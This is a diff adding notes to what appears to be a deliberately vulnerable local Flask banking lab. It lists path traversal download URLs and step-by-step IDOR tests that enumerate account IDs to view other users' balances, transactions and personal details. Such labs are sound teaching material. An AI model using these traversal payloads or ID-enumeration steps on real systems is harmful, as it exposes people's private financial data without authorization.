@@ -72,3 +72,41 @@ http://127.0.0.1:5000/download?file=../app/auth.py
 http://127.0.0.1:5000/download?file=../app/__init__.py
 
 if the file is installed successfully. then the attack was successful.
+
+
+
+
+## 🧪 **TEST IDOR ATTACK:**
+
+### **Test 1: View Your Own Account (Normal)**
+```
+1. Login as: admin / admin123
+2. Go to Dashboard
+3. Click "Account Details"
+4. URL: http://localhost:5000/account/1
+5. ✅ See your account info (normal behavior)
+```
+
+---
+
+### **Test 2: IDOR Attack - View Other User's Account**
+```
+1. Still logged in as admin
+2. Manually change URL to: http://localhost:5000/account/2
+3. ✅ ATTACK SUCCESS! 
+   → See Alice's account balance!
+   → See Alice's transactions!
+   → See Alice's personal info!
+```
+
+---
+
+### **Test 3: Loop Through All Accounts**
+```
+Try:
+http://localhost:5000/account/1  → Admin
+http://localhost:5000/account/2  → Alice
+http://localhost:5000/account/3  → Bob
+http://localhost:5000/account/4  → Attacker
+
+✅ Can view ALL accounts!
